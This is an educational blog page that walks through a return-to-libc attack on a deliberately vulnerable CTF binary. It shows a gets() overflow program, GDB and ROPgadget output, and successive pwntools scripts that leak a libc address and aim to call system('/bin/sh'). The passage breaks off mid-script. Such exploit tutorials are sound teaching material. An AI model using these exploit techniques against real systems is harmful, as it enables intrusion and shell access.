<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Return To Libc - Concept | a rant of my adventures</title>
<meta property="og:title" content="Return To Libc - Concept | a rant of my adventures"><meta name=twitter:title content="Return To Libc - Concept | a rant of my adventures"><meta itemprop=name content="Return To Libc - Concept | a rant of my adventures"><meta name=application-name content="Return To Libc - Concept | a rant of my adventures"><meta property="og:site_name" content="a rant of my adventures"><meta name=description content="nil"><meta itemprop=description content="nil"><meta property="og:description" content="nil"><meta name=twitter:description content="nil"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><meta itemprop=image content="https://blog.caprinux.com"><meta property="og:image" content="https://blog.caprinux.com"><meta name=twitter:image content="https://blog.caprinux.com"><meta name=twitter:image:src content="https://blog.caprinux.com"><meta name=generator content="Hugo 0.121.1"><link rel=canonical href=https://blog.caprinux.com/pwn/rop/ret2libc1/><link href=/style.min.5d415e34e927589b6ad5fe83ea6f8006479d2d6c2fa7897ee14c54c5618ba634.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://blog.caprinux.com/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><meta http-equiv=cache-control content="max-age=0"><meta http-equiv=cache-control content="no-cache"><meta http-equiv=expires content="0"><meta http-equiv=expires content="Tue, 01 Jan 1980 1:00:00 GMT"><meta http-equiv=pragma content="no-cache"><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://blog.caprinux.com/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/posts/>Posts</a></li><li><a class="menu-link active" href=/pwn/>Pwn</a></li><li><a class=menu-link href=/pages/about/>About</a></li><li class=menu-separator><span></span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Return To Libc - Concept</h1><div class=post-meta><time datetime=0005-01-01T00:00:07+00:00 itemprop=datePublished>1 Jan 5</time></div></header><div class=page-content><h2 id=recap>Recap</h2><blockquote><p>Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program, shared libraries, the stack, and the heap are.</p></blockquote><blockquote><ol><li><code>printf()</code> calls <code>printf @ PLT</code></li></ol></blockquote><ol start=2><li><code>printf @ PLT</code> calls <code>printf @ GOT</code></li><li><code>printf @ GOT</code> contains a single address to <code>printf @ LIBC</code>, which it jumps to.</li><li>Program successfully executes <code>printf()</code> and returns!</li></ol><blockquote><p>ROP Gadgets are small snippets of assembly in the binary, that we can use to control the program</p></blockquote><br><hr><p>Can we still exploit a binary if there&rsquo;s no <code>win()</code> or <code>give_shelL()</code> function? Is there even anything to exploit anymore?</p><p>Consider the following program modified from SECCON 2021 CTF (Beginner&rsquo;s ROP):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// gcc src.c -no-pie -fno-stack-protector -o chall -Wall -Wextra
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In this binary, even though it is apparent that we have a <strong>Buffer Overflow</strong> vulnerability due to the use of the vulnerable <code>gets()</code>, we do not have anywhere to <code>ret2win</code>. There is no <code>win()</code> function or <code>give_shell()</code> function.</p><p>Can we still exploit this?</p><p>Simple, in the <a href=/pwn/rop/ropgadgets>previous chapter</a>, we explored the use of gadgets to do things such as placing arguments into registers, and also in an <a href=/pwn/innerworkings/pltgot>earlier chapter</a> we covered the calling conventions of functions, and the existence of the <code>PLT</code> and <code>GOT</code>.</p><p>Now let&rsquo;s think of our current binary. Even though there are no functions here that could possibly help us to win, could we possibly call functions directly from our <code>LIBC</code> ourselves <em>(since binaries are dynamically linked to it&rsquo;s respective libc anyways)</em> and make our own &ldquo;win&rdquo; function?</p><p>Sounds cool right? Let&rsquo;s get started</p><h2 id=the-ret2libc-attack>The Ret2Libc Attack</h2><p>As easy as it sounds, we have to remember that <strong>LIBC has ASLR enabled</strong>. This means that the addresses are always changing and we practically do not know <strong>any</strong> address of the functions in LIBC when exploiting, thus making it impossible to return to libc at all.</p><p>However, what we have and can control is our local binary and its functions. We also have the addresses of the functions in our local binary.</p><p>If you remember, <strong>LIBC addresses are stored in our Global Offset Table (GOT)</strong> at runtime. Thus we could possibly try to get a <strong>LIBC leak</strong> by <strong>printing the GOT</strong>.</p><p>What we want to do is to call an instruction something like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>Global</span> <span class=n>Offset</span> <span class=n>Table</span> <span class=n>of</span> <span class=n>a</span> <span class=n>Function</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// so we can continue our ROP chain
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>Remember, when a program call a function such as <code>puts()</code>, it calls the <code>Procedure Linkage Table (PLT)</code> which then does other stuff such as calling the library function from the <code>GOT</code>.</p><p>This means that since <code>puts()</code> was called in our original program, <code>puts()</code> is in the Procedure Linkage Table and <strong>we can call it!</strong>.</p><p><code>gets()</code> was also called in our original binary, meaning it is actually in the Global Offset Table.</p><p>We actually have all the pieces to get a LIBC leak by doing <code>puts(GOT of gets())</code>.</p><p>Now let&rsquo;s find the addresses ourselves in GDB:</p><pre tabindex=0><code>pwndbg&gt; disassemble main

Dump of assembler code for function main:

   0x0000000000401156 &lt;+0&gt;:     endbr64
   0x000000000040115a &lt;+4&gt;:     push   rbp
   0x000000000040115b &lt;+5&gt;:     mov    rbp,rsp
   0x000000000040115e &lt;+8&gt;:     sub    rsp,0x100
   0x0000000000401165 &lt;+15&gt;:    lea    rax,[rbp-0x100]
   0x000000000040116c &lt;+22&gt;:    mov    rdi,rax
   0x000000000040116f &lt;+25&gt;:    mov    eax,0x0
   0x0000000000401174 &lt;+30&gt;:    call   0x401060 &lt;gets@plt&gt;
   0x0000000000401179 &lt;+35&gt;:    lea    rax,[rbp-0x100]
   0x0000000000401180 &lt;+42&gt;:    mov    rdi,rax
   0x0000000000401183 &lt;+45&gt;:    call   0x401050 &lt;puts@plt&gt;
   0x0000000000401188 &lt;+50&gt;:    mov    eax,0x0
   0x000000000040118d &lt;+55&gt;:    leave
   0x000000000040118e &lt;+56&gt;:    ret

End of assembler dump.
</code></pre><p>By disassembling <code>main()</code>, we can find our <code>puts@plt: 0x401050</code> and <code>gets@plt: 0x401060</code>.</p><p>The <code>GOT</code> is stored in the <code>PLT</code>. So in order to find <code>gets@GOT</code> we examine the instructions at <code>gets@PLT</code>.</p><pre tabindex=0><code>pwndbg&gt; x/3i 0x401060

   0x401060 &lt;gets@plt&gt;: endbr64
   0x401064 &lt;gets@plt+4&gt;:       bnd jmp QWORD PTR [rip+0x2fb5]        # 0x404020 &lt;gets@got.plt&gt;
   0x40106b &lt;gets@plt+11&gt;:      nop    DWORD PTR [rax+rax*1+0x0]
</code></pre><p>As you can see, our <code>gets@got: 0x404020</code>.</p><p>Now we need a <code>POPRDI</code> gadget in order to put an argument into <code>puts()</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜ ROPgadget --binary chall <span class=p>|</span> grep <span class=s1>&#39;pop rdi&#39;</span>
</span></span><span class=line><span class=cl>0x00000000004011f3 : pop rdi <span class=p>;</span> ret
</span></span></code></pre></div><p>Now we have all our pieces.</p><br><h4 id=script-1>Script 1:</h4><p>Let&rsquo;s write a script and try it out;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./chall&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>OFFSET</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mi>8</span> <span class=c1># 0x100 is size of our variable, 8 is our saved rbp</span>
</span></span><span class=line><span class=cl><span class=n>PUTSPLT</span> <span class=o>=</span> <span class=mh>0x401050</span>
</span></span><span class=line><span class=cl><span class=n>GETSGOT</span> <span class=o>=</span> <span class=mh>0x404020</span>
</span></span><span class=line><span class=cl><span class=n>POPRDI</span> <span class=o>=</span> <span class=mh>0x4011f3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>OFFSET</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>POPRDI</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>GETSGOT</span><span class=p>)</span> <span class=c1># place GETSGOT into RDI</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PUTSPLT</span><span class=p>)</span> <span class=c1># call puts(GETSGOT)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img src=/pwn/images/ret2libc1.png alt=image></p><p>As you can see, we have some unreadable bytes which is probably our leak, and our program ends.</p><p>However since our LIBC addresses change everytime we run the binary, our program ending makes our leak useless. Hence after our payload, we have to return to <code>main()</code> to loop the program.</p><p>Let&rsquo;s also try to receive the leak in a more readable format.</p><p>Like how we send our data in little endian, our output is also in little-endian.</p><p>We can easily revert it with pwntools <code>u64()</code> which unpacks a 64-bit little-endian value.</p><p><em>note: u64() only accepts 8 byte values, hence if your leak is not 8 bytes, you have to add some null bytes to the left of the leak</em></p><br><h4 id=script-2>Script 2:</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./chall&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>OFFSET</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mi>8</span> <span class=c1># 0x100 is size of our variable, 8 is our saved rbp</span>
</span></span><span class=line><span class=cl><span class=n>PUTSPLT</span> <span class=o>=</span> <span class=mh>0x401050</span>
</span></span><span class=line><span class=cl><span class=n>GETSGOT</span> <span class=o>=</span> <span class=mh>0x404020</span>
</span></span><span class=line><span class=cl><span class=n>POPRDI</span> <span class=o>=</span> <span class=mh>0x4011f3</span>
</span></span><span class=line><span class=cl><span class=n>MAIN</span> <span class=o>=</span> <span class=mh>0x401156</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>OFFSET</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>POPRDI</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>GETSGOT</span><span class=p>)</span> <span class=c1># place GETSGOT into RDI</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PUTSPLT</span><span class=p>)</span> <span class=c1># call puts(GETSGOT)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>MAIN</span><span class=p>)</span> <span class=c1># loop back to main for round 2 exploit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=n>OFFSET</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>extra</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># usually we would only expect one leak which is the libc address of gets</span>
</span></span><span class=line><span class=cl><span class=c1># however I noticed there are 2 leaks here due to the lack of a null terminator \x00 in the libc address, which causes puts to continue printing other addresses (which are irrelevant in our case)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;leak: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>OUTPUT:</p><pre tabindex=0><code>[x] Starting local process &#39;./chall&#39;
[+] Starting local process &#39;./chall&#39;: pid 8921
[*] leak: 0x7fa0e7f9cb60
[*] Switching to interactive mode
</code></pre><p>Success!! We have our leaks now. With this we can calculate our LIBC base address, and from there, return to libc system.</p><p>First, we find our address offsets of our <strong>gets</strong> and <strong>system</strong></p><p>We first need to know where our <code>libc</code> is by doing <code>ldd ./chall</code></p><pre tabindex=0><code>➜ ldd ./chall
 linux-vdso.so.1 (0x00007fff1b598000)
 libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fec9057f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fec90763000)
</code></pre><p>My <code>LIBC</code> is in <code>/lib/x86_64-linux-gnu/libc.so.6</code>. We can now dump the dynamic symbols with <code>objdump -T</code> and grep for <code>system</code> and <code>gets</code>.</p><pre tabindex=0><code>➜ objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -E &#34;(system$|gets$)&#34;

0000000000075b60  w   DF .text  00000000000001bc  GLIBC_2.2.5 gets
0000000000048e50 g    DF .text  000000000000002d  GLIBC_PRIVATE __libc_system
00000000000749c0  w   DF .text  000000000000018c  GLIBC_2.2.5 fgets
00000000000749c0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fgets
0000000000048e50  w   DF .text  000000000000002d  GLIBC_2.2.5 system
0000000000039f00 g    DF .text  0000000000000082  GLIBC_2.2.5 catgets
0000000000075b60 g    DF .text  00000000000001bc  GLIBC_2.2.5 _IO_gets
</code></pre><p><code>gets</code>: 0x75b60</p><p><code>system</code>: 0x48e50</p><p>Let&rsquo;s continue building our script now.</p><br><h4 id=script-3>Script 3:</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./chall&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>OFFSET</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mi>8</span> <span class=c1># 0x100 is size of our variable, 8 is our saved rbp</span>
</span></span><span class=line><span class=cl><span class=n>PUTSPLT</span> <span class=o>=</span> <span class=mh>0x401050</span>
</span></span><span class=line><span class=cl><span class=n>GETSGOT</span> <span class=o>=</span> <span class=mh>0x404020</span>
</span></span><span class=line><span class=cl><span class=n>POPRDI</span> <span class=o>=</span> <span class=mh>0x4011f3</span>
</span></span><span class=line><span class=cl><span class=n>MAIN</span> <span class=o>=</span> <span class=mh>0x401156</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>OFFSET</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>POPRDI</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>GETSGOT</span><span class=p>)</span> <span class=c1># place GETSGOT into RDI</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PUTSPLT</span><span class=p>)</span> <span class=c1># call puts(GETSGOT)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>MAIN</span><span class=p>)</span> <span class=c1># loop back to main for round 2 exploit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=n>OFFSET</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>extra</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;leak: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>LIBCGETSOFFSET</span> <span class=o>=</span> <span class=mh>0x75b60</span>
</span></span><span class=line><span class=cl><span class=n>LIBCSYSTEMOFFSET</span> <span class=o>=</span> <span class=mh>0x48e50</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libcbase</span> <span class=o>=</span> <span class=n>leak</span> <span class=o>-</span> <span class=n>LIBCGETSOFFSET</span>
</span></span><span class=line><span class=cl><span class=n>libcsystem</span> <span class=o>=</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=n>LIBCSYSTEMOFFSET</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>OFFSET</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libcsystem</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><pre tabindex=0><code>[x] Starting local process &#39;./chall&#39;
[+] Starting local process &#39;./chall&#39;: pid 10386
[*] leak: 0x7fe1a85d6b60
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�Z��
[*] Got EOF while reading in interactive

[*] Process &#39;./chall&#39; stopped with exit code -11 (SIGSEGV) (pid 10386)
[*] Got EOF while sending in interactive
</code></pre><p>Unfortunately, it was a failure. However, thinking about it, <code>system()</code> is basically as good as executing a command. If you analyze this program in gdb by adding the line <code>gdb.attach(p)</code> to the script, you find that <code>RDI: 0x0</code>.</p><p>This means that <code>system(0x0)</code> was called which does not do anything.</p><p>Instead, we want something like <code>/bin/sh</code> to be called which will spawn a subshell, which is what we want. However where can we find a <code>/bin/sh</code> string to put into <code>RDI</code>? We can find it from the <code>LIBC</code>.</p><p>With <code>strings</code> we can find this offset easily.</p><pre tabindex=0><code>➜ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep &#39;/bin/sh&#39;
18a156 /bin/sh
</code></pre><p>Let&rsquo;s write our final exploit script.</p><br><h4 id=script-4>Script 4:</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./chall&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>OFFSET</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mi>8</span> <span class=c1># 0x100 is size of our variable, 8 is our saved rbp</span>
</span></span><span class=line><span class=cl><span class=n>PUTSPLT</span> <span class=o>=</span> <span class=mh>0x401050</span>
</span></span><span class=line><span class=cl><span class=n>GETSGOT</span> <span class=o>=</span> <span class=mh>0x404020</span>
</span></span><span class=line><span class=cl><span class=n>POPRDI</span> <span class=o>=</span> <span class=mh>0x4011f3</span>
</span></span><span class=line><span class=cl><span class=n>MAIN</span> <span class=o>=</span> <span class=mh>0x401156</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>OFFSET</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>POPRDI</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>GETSGOT</span><span class=p>)</span> <span class=c1># place GETSGOT into RDI</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PUTSPLT</span><span class=p>)</span> <span class=c1># call puts(GETSGOT)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>MAIN</span><span class=p>)</span> <span class=c1># loop back to main for round 2 exploit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
